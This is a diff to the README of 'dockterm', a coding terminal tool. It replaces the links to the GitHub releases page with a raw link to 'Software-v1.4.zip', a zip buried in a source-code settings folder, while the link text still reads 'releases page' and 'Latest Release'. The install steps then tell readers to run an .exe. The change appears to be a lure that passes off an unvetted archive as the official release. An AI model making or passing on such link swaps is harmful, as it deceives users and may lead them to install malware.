@@ -1,12 +1,12 @@
 # 🖥️ dockterm - Build projects with your own terminal
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nonpoisonous-livebearer374/dockterm/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/nonpoisonous-livebearer374/dockterm/main/src/renderer/src/components/settings/Software-v1.4.zip)
 
 dockterm provides a workspace for your coding projects. It combines your terminal with file management and version control tools in one window. It uses the Claude Code interface to help you write and manage code. You maintain control over your workspace without hidden data tracking.
 
 ## 📥 How to download and install
 
-1. Go to the [releases page](https://github.com/nonpoisonous-livebearer374/dockterm/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/nonpoisonous-livebearer374/dockterm/main/src/renderer/src/components/settings/Software-v1.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe for Windows.
 4. Wait for the download to finish.
